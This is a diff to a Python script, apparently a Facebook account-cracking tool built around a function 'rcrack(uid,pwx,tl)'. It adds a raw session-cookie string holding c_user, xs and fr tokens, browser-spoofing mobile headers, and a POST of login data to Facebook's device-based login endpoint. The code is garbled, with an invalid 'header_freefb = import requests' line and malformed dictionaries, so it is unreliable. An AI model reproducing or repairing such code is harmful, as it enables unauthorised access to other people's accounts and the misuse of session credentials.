@@ -296,30 +296,26 @@ def rcrack(uid,pwx,tl):
             header_freefb = import requests
 
 cookies = {
-    'datr': 'n2q0ZA09Izx9O5PN8RY58IgU',
-    'sb': 'XLS0ZL60TMvbmpQGA7o3yWL5',
-    'm_pixel_ratio': '2.75',
-    'wd': '393x779',
+   sb=gdfRwBB51aQS4GUCOLFdmEbQ;c_user=100091241884528;xs=49:riKVdJsnMX2HLw:2:1689957211:-1:5222;fr=0hxTK1TtDbAJhLcoz.AWVxUFFMXHo6Tnob_MTrk_t1T1s.BkurNa..AAA.0.0.BkurNa.AWUXC-Zqopo;datr=WrO6ZHaAbQ4eAXcC879L91yu
     'fr': '0bUowakfJMomUG8vj..BktGqf.6b.AAA.0.0.BkurJn.AWXB3HLOPfg',
 }
 
-    headers={'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'cache-control': 'max-age=0',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-    'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"13.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
-}
+        header_freefb{'authority': 'mbasic.facebook.com',
+       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+       'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+       'cache-control': 'max-age=0',
+       'sec-ch-prefers-color-scheme': 'light',
+       'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+       'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
+       'sec-ch-ua-mobile': '?1',
+       'sec-ch-ua-platform': '"Android"',
+       'sec-ch-ua-platform-version': '"13.0.0"',
+       'sec-fetch-dest': 'document',
+       'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'none',
+       'sec-fetch-user': '?1',
+       'upgrade-insecure-requests': '1',
+       'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
 
 response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)
             lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
